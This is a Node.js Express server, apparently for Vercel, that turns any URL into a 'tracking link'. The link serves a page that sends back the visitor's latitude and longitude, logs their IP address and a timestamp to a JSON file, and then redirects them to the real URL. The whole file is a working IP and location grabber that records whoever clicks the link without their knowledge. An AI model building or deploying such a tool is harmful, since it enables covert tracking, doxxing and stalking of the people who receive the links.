const express = require('express');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

const app = express();

const dataFilePath = path.join(__dirname, '..', 'data.json');

function readData() {
  try {
    const data = fs.readFileSync(dataFilePath, 'utf-8');
    return JSON.parse(data);
  } catch (err) {
    return { trackingLinks: {}, trackingData: {} };
  }
}

function writeData(data) {
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
}

app.use(express.json());

// Endpoint to create a tracking link
app.post('/create-link', (req, res) => {
  const { url } = req.body;
  if (!url) {
    return res.status(400).json({ error: 'URL is required' });
  }
  const data = readData();
  const id = uuidv4();
  data.trackingLinks[id] = url;
  writeData(data);

  // Construct base URL for Vercel environment
  const baseUrl = req.headers['x-forwarded-proto'] + '://' + req.headers['x-forwarded-host'];

  res.json({ trackingUrl: `${baseUrl}/track/${id}` });
});

// Serve tracking page
app.get('/track/:id', (req, res) => {
  const id = req.params.id;
  const data = readData();
  if (!data.trackingLinks[id]) {
    return res.status(404).send('Tracking link not found');
  }
  res.sendFile('track.html', { root: './public' });
});

// Receive tracking data (location and IP)
app.post('/track/:id/data', (req, res) => {
  const id = req.params.id;
  const data = readData();
  if (!data.trackingLinks[id]) {
    return res.status(404).json({ error: 'Tracking link not found' });
  }
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { latitude, longitude } = req.body;
  data.trackingData[id] = {
    ip,
    latitude,
    longitude,
    timestamp: new Date().toISOString(),
  };
  writeData(data);
  console.log('Tracking data received:', data.trackingData[id]);
  res.json({ message: 'Data received' });
});

// Redirect to original URL after tracking
app.get('/redirect/:id', (req, res) => {
  const id = req.params.id;
  const data = readData();
  const url = data.trackingLinks[id];
  if (!url) {
    return res.status(404).send('Tracking link not found');
  }
  res.redirect(url);
});

module.exports = app;

// Vercel serverless handler
const serverless = require('serverless-http');
module.exports.handler = serverless(app);
